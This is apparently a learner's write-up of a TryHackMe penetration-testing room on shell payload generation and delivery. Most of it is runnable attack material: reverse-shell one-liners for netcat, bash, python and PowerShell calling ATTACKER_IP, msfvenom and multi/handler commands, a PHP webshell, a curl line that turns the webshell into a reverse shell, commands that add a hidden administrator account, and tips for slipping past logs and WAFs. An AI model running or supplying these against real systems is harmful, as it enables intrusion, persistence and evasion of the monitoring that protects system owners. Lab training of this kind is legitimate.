# Shell Payload Generation & Delivery (TryHackMe)

- **Path/module:** Jr Penetration Tester -> Metasploit and Exploitation (room 7 of 7 - final room of the
  module).
- **Room:** Shell Payload Generation & Delivery (~60 min, premium). Manual one-liner payloads, `msfvenom`
  generation (staged vs stageless, encoders, formats), `multi/handler` session management, webshells, then
  Linux + Windows practical exercises.
- **Date:** 2026-10-16.
- **Status:** SOLVED - all graded questions (Tasks 2-7). Answers are command/concept recall from the task
  text; the Linux (Task 6) and Windows (Task 7) exercises are optional hands-on, not separately graded.
- **Lab (optional practice):** Linux box via SSH `shell : <redacted-pw>`, web upload at `http://MACHINE_IP`;
  Windows Server 2019 + XAMPP (`<ip>`) via `xfreerdp ... /u:Administrator /p:'<redacted-pw>'`.

## Answers

| Task | Question | Answer |
|------|----------|--------|
| 2 | nc reverse/bind shell technique when `-e` is unavailable | *(find it yourself)* |
| 2 | .NET class the PowerShell one-liner uses to connect | *(find it yourself)* |
| 2 | Bash pseudo-device path for a TCP connection | *(find it yourself)* |
| 3 | 64-bit Linux stageless reverse TCP payload | *(find it yourself)* |
| 3 | Flag for number of encoding iterations | *(find it yourself)* |
| 3 | Payload type that runs in memory w/ post-ex commands | *(find it yourself)* |
| 4 | Command that loads the handler module | *(find it yourself)* |
| 4 | Flag to run the handler as a background job | *(find it yourself)* |
| 4 | Interact with a specific active session | *(find it yourself)* |
| 5 | PHP function that executes system commands | *(find it yourself)* |
| 5 | HTTP method that avoids access-log command logging | *(find it yourself)* |
| 5 | PentestMonkey PHP reverse shell in Kali | *(find it yourself)* |
| 6 | msfvenom format flag for a Linux ELF binary | *(find it yourself)* |
| 6 | Output confirming the staged two-phase handshake | *(find it yourself)* |
| 7 | Meterpreter command showing OS/hostname | *(find it yourself)* |

## Manual payloads (no msfvenom needed)

When the target lacks tooling or filters `-e`, fall back to interpreter one-liners:

```bash
# netcat WITHOUT -e, via a named pipe (FIFO) - bind, then reverse
mkfifo /tmp/f; nc -lvnp 8080 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
mkfifo /tmp/f; nc ATTACKER_IP 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# bash built-in /dev/tcp (needs bash --enable-net-redirections; absent on minimal installs)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# python3 (dup the socket onto fd 0/1/2, then pty for interactivity)
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'

# PowerShell (Windows) - .NET System.Net.Sockets.TCPClient, iex loop
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);..."
```

- The FIFO trick builds the circular data flow `-e` would have given: nc's output -> shell -> back into the
  pipe -> nc. Self-cleans with `rm /tmp/f` on disconnect.
- Pick by *what's installed and watched*: Windows favours PowerShell (but PS is heavily logged/AMSI'd),
  Linux favours bash/python; check interpreters, test alt ports if egress is filtered.
- `PayloadsAllTheThings` (Methodology and Resources) is the reference sheet for unusual interpreters.

## msfvenom (generated, standalone payloads)

```bash
msfvenom -p <platform>/<arch>/<payload> LHOST=<ip> LPORT=<port> -f <format> -o <out>
```

- **Staged vs stageless - read the separator:**
  - **Stageless** = underscore before transport, e.g. `linux/x64/shell_reverse_tcp`. Whole agent in the
    file; single connection; works with a plain `nc` listener; larger, more AV-visible.
  - **Staged** = slash before transport, e.g. `windows/x64/shell/reverse_tcp`. Tiny stager pulls the rest
    over the network; the full payload never hits disk; **requires `multi/handler`** (netcat can't do the
    staging handshake). Confirm with `msfvenom --list payloads` / `msfvenom --info <payload>` - the
    slash/underscore rule is reliable but not universal.
- **meterpreter** = in-memory post-ex agent (file ops, network discovery, privesc, pivoting); needs
  `multi/handler`. Staged `.../meterpreter/reverse_tcp` vs stageless `..._meterpreter_reverse_tcp`.
- **Formats:** `exe` (Windows), `elf` (Linux), `dll`, `aspx`/`jsp`/`war` (web), `python`, `powershell`.
- **Encoding != evasion** (same caveat as the Payload Generation room): `-e x64/xor -i 3` mutates the
  signature but modern EDR is behaviour-based, so encoder iterations rarely beat it alone.

## multi/handler (catch staged + manage sessions)

```text
sudo msfconsole            # sudo needed to bind LPORT < 1024
use multi/handler
set PAYLOAD <must EXACTLY match the msfvenom payload, incl. arch + staging>
set LHOST <interface IP, e.g. ens5 on the AttackBox - never 0.0.0.0/localhost>
set LPORT 4444
exploit -j                 # -j = background job; keep the console free
sessions                   # list
sessions -i 1              # interact with session 1
background  (or Ctrl+Z)    # return to console, session stays alive
jobs                       # list running handlers (can run several concurrently)
```

- **Handler must mirror the payload exactly** - a `shell/reverse_tcp` handler will **not** catch a
  `shell_reverse_tcp` payload. Payload/arch/staging + LHOST + LPORT are the three that silently drop the
  connection if wrong.
- Use a plain listener for stageless; use `multi/handler` for staged / meterpreter / multi-session /
  post-ex integration.

## Webshells (code exec over HTTP)

```php
// minimal PHP (GET) - the one uploaded in the exercises
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

- Call: `http://target/uploads/shell.php?cmd=whoami`. Blends into web traffic; survives firewalls that
  block raw reverse/bind shells (pure HTTP/S).
- **POST** over GET keeps commands out of the access log / URL history; add an `auth` password check so
  others can't ride your shell.
- Platform-matched languages: PHP (`shell_exec`), ASP.NET/C# (`Process` + `cmd.exe /c`), JSP
  (`Runtime.getRuntime().exec`).
- **Upgrade a webshell to a real shell** by firing a reverse-shell one-liner through `cmd=` - URL-encode it
  or let `curl` do it:
  ```bash
  curl -G "http://MACHINE_IP/uploads/shell.php" \
    --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/CONNECTION_IP/4444 0>&1'"
  ```
  `-G` forces the urlencoded data into the query string as a GET. Spaces/`>`/`&` MUST be encoded or the
  server sees only a fragment.
- Kali ships ready-made ones at `/usr/share/webshells/` (also on the AttackBox); **`php-reverse-shell.php`**
  (PentestMonkey) opens a direct reverse connection instead of one-command-at-a-time HTTP.

## Practical exercises (what each one proves)

- **Linux stageless ELF:** `msfvenom -p linux/x64/shell_reverse_tcp ... -f elf -o shell.elf` -> serve with
  `python3 -m http.server 8000` -> `wget`/`chmod +x`/run on target -> caught by `nc -lvnp 4444`.
- **Linux staged via handler:** same but `linux/x64/shell/reverse_tcp` + `multi/handler`; the **`Sending
  stage`** line in msfconsole confirms the two-phase handshake.
- **PHP webshell -> reverse shell:** upload `shell.php`, trigger the `curl --data-urlencode` bash payload.
- **Windows stageless EXE:** `windows/x64/shell_reverse_tcp -f exe`; `Invoke-WebRequest` to download, run,
  catch with `nc`.
- **Windows staged meterpreter:** `windows/x64/meterpreter/reverse_tcp -f exe` + handler -> `sessions -i 1`
  -> `sysinfo` / `getuid`.
- **Windows admin via webshell -> RDP:** through the webshell,
  `net user pentester Passw0rd! /add` then `net localgroup administrators pentester /add` (spaces `%20`),
  then `xfreerdp ... /u:pentester /p:'Passw0rd!'`. Lab creds - disposable THM values.

## Lessons learned

- **The slash/underscore in a payload name tells you the listener.** `shell/reverse_tcp` (staged) needs
  `multi/handler`; `shell_reverse_tcp` (stageless) is happy with netcat. Guessing wrong = the payload fires
  and "nothing shows up". `--info` settles it.
- **Handler config must mirror the payload byte-for-byte.** Payload string (incl. arch + staging), LHOST,
  LPORT. LHOST is the hardcoded callback baked into the binary - set it to the real interface IP
  (`ens5`/`tun0`), never `0.0.0.0`. This is the #1 "payload ran but no session" cause.
- **Have interpreter fallbacks for missing/neutered tools.** OpenBSD nc strips `-e` -> `mkfifo` named pipe;
  no scripting langs -> `bash -i >& /dev/tcp/...` (only if bash has net-redirections). Enumerate what's
  actually on the box before committing to a payload.
- **Webshells are the move when the network says no.** Pure HTTP/S code exec slips past firewalls that kill
  reverse/bind shells; then bootstrap to a full shell via a URL-encoded one-liner. POST + boring filename +
  slow, varied requests to stay under WAF / FIM / log analysis. Always plan webshell cleanup - leaving a
  backdoor in prod is never acceptable, even on an authorised test.
- **URL-encode or lose the command.** `>`, `&`, spaces, quotes truncate the command server-side; `curl -G
  --data-urlencode` (or `%20`/full encoding) is non-negotiable for webshell payloads.

## Related

- [[shells-and-listeners-fundamentals]] - previous room; this one generates the payloads that call back to
  those listeners (the nc/socat/rlwrap/handler ladder).
- [[metasploit-payload-generation]] - the deeper msfvenom room (encoders, `-x` template inject, transports);
  the "encoding != evasion" and exact-LHOST lessons recur here.
- [[metasploit-module-plan]] - **this completes the Metasploit and Exploitation module (7/7).**
